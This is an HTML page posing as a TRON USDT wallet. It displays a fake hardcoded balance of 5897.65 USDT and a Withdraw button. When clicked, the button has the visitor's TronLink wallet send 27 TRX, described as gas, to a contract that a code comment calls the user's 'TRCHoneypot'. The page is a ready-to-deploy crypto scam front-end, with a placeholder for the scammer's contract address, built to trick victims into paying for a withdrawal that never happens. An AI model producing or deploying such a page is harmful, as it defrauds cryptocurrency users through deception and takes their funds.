<!DOCTYPE html>
<html>
<head>
  <title>USDT Wallet | TRON</title>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
  <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
  <style>
    body {
      margin: 0;
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      font-family: 'Roboto', sans-serif;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .container {
      background: #161b22;
      padding: 40px;
      border-radius: 18px;
      box-shadow: 0 0 25px rgba(0, 255, 153, 0.3);
      text-align: center;
      width: 340px;
    }
    .logo {
      width: 60px;
      margin-bottom: 16px;
    }
    .title {
      font-size: 26px;
      margin-bottom: 8px;
      color: #00ffcc;
      font-weight: 700;
    }
    .balance {
      font-size: 18px;
      margin-bottom: 20px;
      color: #00ff99;
    }
    button {
      background: #00ff99;
      color: #000;
      border: none;
      padding: 12px 26px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.25s ease;
      box-shadow: 0 4px 10px rgba(0, 255, 153, 0.3);
    }
    button:hover {
      background: #00e68a;
    }
    .status {
      margin-top: 18px;
      font-size: 14px;
      color: #cccccc;
    }
    .spinner {
      display: none;
      margin: 12px auto 0;
      border: 4px solid transparent;
      border-top: 4px solid #00ffcc;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT Logo" class="logo">
    <div class="title">TRON USDT Wallet</div>
    <div class="balance">Balance: <span id="balance">5897.65</span> USDT</div>
    <button onclick="attemptWithdraw()">Withdraw</button>
    <div class="spinner" id="spinner"></div>
    <div class="status" id="status"></div>
  </div>

  <script>
    const CONTRACT_ADDRESS = "TUXXXXXXXXXXXXXXXXXXXXXX"; // <- Twój TRCHoneypot
    const CONTRACT_ABI = [
      {
        "inputs": [],
        "name": "attemptWithdraw",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
      }
    ];

    let tronWeb, contract;

    async function setup() {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        document.getElementById("status").innerText = "Please connect TronLink wallet.";
        return;
      }
      tronWeb = window.tronWeb;
      contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
    }

    async function attemptWithdraw() {
      const spinner = document.getElementById("spinner");
      const status = document.getElementById("status");
      spinner.style.display = "block";
      status.innerText = "⏳ Sending withdrawal request (27 TRX gas)...";

      try {
        await contract.attemptWithdraw().send({ callValue: 27000000 });
        status.innerText = "✅ Request submitted. Await confirmation...";
      } catch (e) {
        status.innerText = "❌ Transaction failed or cancelled.";
      } finally {
        spinner.style.display = "none";
      }
    }

    window.addEventListener("load", setup);
  </script>
</body>
</html>
